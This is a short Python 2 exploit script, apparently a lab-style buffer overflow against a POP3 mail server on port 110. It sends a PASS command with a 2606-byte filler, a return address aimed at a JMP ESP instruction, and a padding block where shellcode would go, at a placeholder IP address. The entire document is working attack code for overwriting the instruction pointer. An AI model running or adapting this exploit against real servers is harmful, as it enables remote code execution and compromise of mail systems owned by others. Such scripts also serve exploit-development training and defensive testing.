#!/usr/bin/python

# 5F4A358F   FFE4             JMP ESP

import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

buffer = "A" * 2606 + "\x8f\x35\x4a\x5f" + "C" * 430

try:

	print "\nSending evil buffer..."

	s.connect(('1.2.3.4',110))

	data = s.recv(1024)

	s.send('USER username' +'\r\n')

	data = s.recv(1024)

	s.send('PASS ' + buffer + '\r\n')

	print "\nDone!."

except:

	print "Could not connect to POP3!"
